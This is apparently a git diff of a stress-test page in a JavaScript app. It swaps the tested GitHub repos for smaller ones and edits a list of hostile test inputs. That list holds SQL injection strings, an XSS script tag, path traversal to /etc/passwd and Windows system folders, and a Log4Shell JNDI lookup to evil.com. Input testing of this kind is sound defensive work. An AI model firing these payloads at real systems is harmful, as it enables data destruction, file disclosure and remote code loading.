@@ -32,16 +32,16 @@ export default function StressTestPage() {
     const repos = [
       { owner: 'microsoft', repo: 'vscode' },
       { owner: 'facebook', repo: 'react' },
-      { owner: 'google', repo: 'tensorflow' },
-      { owner: 'torvalds', repo: 'linux' },
-      { owner: 'nodejs', repo: 'node' }
+      { owner: 'vercel', repo: 'next.js' }, // Smaller than tensorflow
+      { owner: 'expressjs', repo: 'express' }, // Medium-sized repo
+      { owner: 'lodash', repo: 'lodash' } // Manageable size
     ]
     
     const maliciousPayloads = [
       "'; DROP TABLE users; --",
       "<script>alert('XSS')</script>",
       "../../etc/passwd",
-      "{{7*7}}",
+      "UNION SELECT * FROM users",
       "${jndi:ldap://evil.com}",
       "../../../windows/system32",
       "eval(process.exit())",
